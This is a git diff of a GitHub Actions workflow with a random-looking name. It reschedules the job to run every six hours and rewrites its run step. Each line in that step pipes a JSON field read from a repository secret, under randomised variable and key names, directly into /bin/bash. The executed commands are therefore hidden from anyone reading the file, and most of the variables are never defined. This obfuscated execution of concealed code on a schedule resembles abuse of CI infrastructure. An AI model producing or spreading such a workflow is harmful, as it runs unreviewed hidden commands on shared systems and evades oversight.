@@ -3,35 +3,24 @@ name: chupanbian4381
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 5/6 * * *'
+    - cron: '5 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: chupanbian4381
         env:
-          zi39159: ${{ secrets.zi39159 }}
+          u5948: ${{ secrets.u5948 }}
         run: |
-          echo $zi39159 | jq -r .jeiwy550 | /bin/bash
-          echo $ugqfu14 | jq -r .sbhz5478 | /bin/bash
-          echo $mw79 | jq -r .zh375 | /bin/bash
-          echo $gfrd405 | jq -r .awdil08 | /bin/bash
-          echo $yots06 | jq -r .m0281 | /bin/bash
-          echo $x88 | jq -r .m0369 | /bin/bash
-          echo $ops959 | jq -r .zugkq4878 | /bin/bash
-          echo $jkhq07464 | jq -r .b8 | /bin/bash
-          echo $ywjf87770 | jq -r .pk0117 | /bin/bash
-          echo $mrhhf20142 | jq -r .dem70 | /bin/bash
-          echo $uyux95785 | jq -r .vmk09208 | /bin/bash
-          echo $s66 | jq -r .bdk93682 | /bin/bash
-          echo $d56823 | jq -r .cbj317 | /bin/bash
-          echo $d54143 | jq -r .ujn39 | /bin/bash
-          echo $xut951 | jq -r .pj8 | /bin/bash
-          echo $rwri6 | jq -r .z2 | /bin/bash
-          echo $vgjnh56 | jq -r .xglwi056 | /bin/bash
-          echo $mmge424 | jq -r .mpcq30 | /bin/bash
-          echo $v22 | jq -r .ytkjh26 | /bin/bash
-          echo $ki37599 | jq -r .jjdun6 | /bin/bash
+          echo $u5948 | jq -r .e14526 | /bin/bash
+          echo $yvxzp81 | jq -r .dyzwm03 | /bin/bash
+          echo $mvwde7 | jq -r .raiun9245 | /bin/bash
+          echo $uthx0 | jq -r .ztyjp3 | /bin/bash
+          echo $nrx29 | jq -r .cjx64 | /bin/bash
+          echo $tnew8741 | jq -r .mlmfz95871 | /bin/bash
+          echo $fv6 | jq -r .ogjg0124 | /bin/bash
+          echo $jbokr11 | jq -r .ijrhb1480 | /bin/bash
+          echo $fbswp938 | jq -r .kihst6 | /bin/bash
 
